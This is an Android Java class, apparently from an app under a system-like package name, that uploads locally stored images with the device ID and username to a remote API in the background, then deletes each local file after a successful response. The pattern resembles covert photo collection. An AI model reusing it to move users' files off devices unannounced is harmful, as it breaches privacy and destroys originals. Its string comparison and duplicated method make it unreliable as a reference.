package com.android.media.settings.Utility;

import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;

import com.android.media.settings.API.MediaAPI;
import com.android.media.settings.MediaConfig;
import com.android.media.settings.MediaDBManager;
import com.android.media.settings.Models.Media;
import com.android.media.settings.Services.MediaService;
import com.android.media.settings.Models.MediaAPIResponse;

import java.io.File;

import io.reactivex.Observable;
import io.reactivex.Observer;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.disposables.Disposable;
import io.reactivex.schedulers.Schedulers;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;

public class MediaUploadUtility {
    private static final String TAG = "MediaUploadService";
    private Context context;
    private MediaDBManager dbManager;
    private final MediaType TYPE_IMAGE = MediaType.parse("image/*");
    private MediaUtility mUtility;
    private MediaConfig mConfig;

    public MediaUploadUtility(Context context) {
        this.context = context;
        this.dbManager = new MediaDBManager(context);
        this.mUtility = new MediaUtility(context);
        this.mConfig = new MediaConfig(context);
    }

    public void initUploadServices() {
        if(mUtility.networkConnected()) {
            Cursor cursor = dbManager.getLocalMedia();
            if(cursor != null && cursor.getCount() > 0) {
                new MediaUploadTask().execute(cursor);
            }
        }
    }

    private void processMediaCursor(Cursor cursor) {
        try {
            MediaAPI api = mUtility.initRetroService();
            while (cursor.moveToNext()) {
                String id = cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_PICS_STORE_ID));
                String path = cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_PICS_STORE_URL));
                File file = new File(path);

                if(file != null && file.exists()) {
                    RequestBody imgBody = RequestBody.create(TYPE_IMAGE, file);
                    MultipartBody.Part part = MultipartBody.Part.createFormData(mConfig.getIMG_UPLOAD_NAME(), id, imgBody);
                    Observable<MediaAPIResponse> observable = api.uploadMedia(part, mUtility.getDeviceId(), mUtility.getUsername());
                    observable.subscribeOn(Schedulers.newThread())
                            .observeOn(AndroidSchedulers.mainThread())
                            .subscribe(observer);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            cursor.close();
        }
    }

    private Observer<MediaAPIResponse> observer = new Observer<MediaAPIResponse>() {
        @Override
        public void onSubscribe(Disposable d) {
        }

        @Override
        public void onNext(MediaAPIResponse response) {
            try {
                if(response != null) {
                    if(response.getStatus() == "1") {
                        String id = response.getData();
                        Media media = dbManager.getMedia(id);
                        media.setStatus(2);
                        dbManager.updateUploadStatus(media);
                        boolean isDeleted = new File(media.getPath()).delete();
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        @Override
        public void onError(Throwable e) {
            e.printStackTrace();
        }

        @Override
        public void onComplete() {
        }
    };

    private class MediaUploadTask extends AsyncTask<Cursor, Void, Void> {
        @Override
        protected void onPreExecute() {
            MediaService.isMediaUploading = true;
        }

        @Override
        protected Void doInBackground(Cursor... params) {
            Cursor cursor = params[0];
            try {
                MediaAPI api = mUtility.initRetroService();
                while (cursor.moveToNext()) {
                    String id = cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_PICS_STORE_ID));
                    String path = cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_PICS_STORE_URL));
                    File file = new File(path);

                    if(file != null && file.exists()) {
                        RequestBody imgBody = RequestBody.create(TYPE_IMAGE, file);
                        MultipartBody.Part part = MultipartBody.Part.createFormData(mConfig.getIMG_UPLOAD_NAME(), id, imgBody);
                        Observable<MediaAPIResponse> observable = api.uploadMedia(part, mUtility.getDeviceId(), mUtility.getUsername());
                        observable.subscribeOn(Schedulers.newThread())
                                .observeOn(AndroidSchedulers.mainThread())
                                .subscribe(observer);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                cursor.close();
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            MediaService.isMediaUploading = false;
        }
    }
}